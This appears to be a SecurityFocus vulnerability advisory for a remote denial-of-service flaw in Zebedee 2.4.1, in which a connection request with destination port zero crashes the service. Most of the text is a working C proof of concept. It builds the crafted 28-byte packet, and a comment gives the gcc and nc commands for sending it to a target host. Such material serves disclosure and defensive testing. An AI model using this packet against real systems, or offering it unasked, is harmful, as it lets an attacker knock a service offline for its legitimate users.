source: http://www.securityfocus.com/bid/14796/info

A remote denial of service vulnerability affects Zebedee. This issue is due to a failure of the application to properly handle exceptional network requests.

Specifically, Zebedee is unable to handle requests for connections that contain a zero for the requested destination port.

A remote attacker may leverage this issue to crash the affected application, denying service to legitimate users.

Zebedee version 2.4.1 is reported vulnerable to this issue; other versions may also be affected.

/*
        $ gcc -o mkZebedeeDoS mkZebedeeDoS.c
        $ ./mkZebedeeDoS > zebedeeDoS
        $ nc targethost port < zebedeeDoS
*/

#include <stdio.h>

int main (int argc, char **argv)
{

        int i, size;

        char data[] = {
        0x02, 0x01, // protocol version
        0x00, 0x00, // flags
        0x20, 0x00, // max message size
        0x00, 0x06, // compression info
        0x00, 0x00, // port request: value = 0x0
        0x00, 0x80, // key length
        0xff, 0xff, 0xff, 0xff, // key token
        0x0b, 0xd8, 0x30, 0xb3, 0x21, 0x9c, 0xa6, 0x74, // nonce value
        0x00, 0x00, 0x00, 0x00 // target host address
         };

        size = 28;
        for(i=0; i<size; i++){
                printf("%c", data[i]);
        }

        return 0;

}